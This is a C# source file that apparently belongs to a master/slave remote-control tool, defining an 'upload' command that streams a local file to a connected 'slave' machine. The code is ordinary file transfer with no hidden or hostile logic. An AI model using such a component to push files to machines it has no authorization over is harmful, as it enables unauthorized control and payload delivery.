using Master.AdvancedConsole;
using Master.Commands.Core;
using System.Collections.Generic;
using System.IO;

namespace Master.Commands
{
    internal class Upload : IMasterCommand, IPreProcessCommand
    {
        public string name { get; } = "upload";

        public string description { get; } = "Upload a file to the slave";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "?*:[localFileName] ?:[remoteFileName]"
        };

        /// <summary>
        /// Check if the specified local file exists
        /// </summary>
        /// <param name="args"></param>
        /// <returns></returns>
        public bool PreProcess(List<string> args)
        {
            if (File.Exists(args[0]))
            {
                return true;
            }

            ColorTools.WriteCommandError("The specified file doesn't exist");
            return false;
        }

        public void Process(List<string> args)
        {
            var path = args[0];
            ColorTools.WriteCommandMessage($"Starting upload of file '{path}' to the slave");

            using (var readStream = new FileStream(path, FileMode.Open))
            {
                MasterCommandsManager.networkManager.StreamToNetworkStream(readStream);
            }

            var result = MasterCommandsManager.networkManager.ReadLine();

            if (result == "Success")
            {
                ColorTools.WriteCommandSuccess("File successfully uploaded to the slave");
            }
            else
            {
                ColorTools.WriteCommandError("An error occured");
            }
        }
    }
}
